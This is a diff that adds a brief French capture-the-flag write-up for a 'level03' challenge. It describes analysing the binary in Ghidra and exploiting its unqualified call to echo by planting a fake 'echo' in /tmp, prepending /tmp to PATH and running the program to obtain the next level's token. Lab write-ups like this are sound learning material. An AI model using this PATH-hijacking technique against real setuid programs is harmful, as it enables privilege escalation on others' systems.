@@ -1,0 +1,10 @@
+on le telecharge en scp et on ouvre l'executable avec ghidra
+
+dump assembler de l'executable level03 = on voie qu'il utilise la fonction echo
+
+cd /tmp
+echo "getflag" > echo
+chmod 777 echo
+export PATH="/tmp:$PATH"
+./level03
+le programe lance getflag et on a le token pour passer au level04
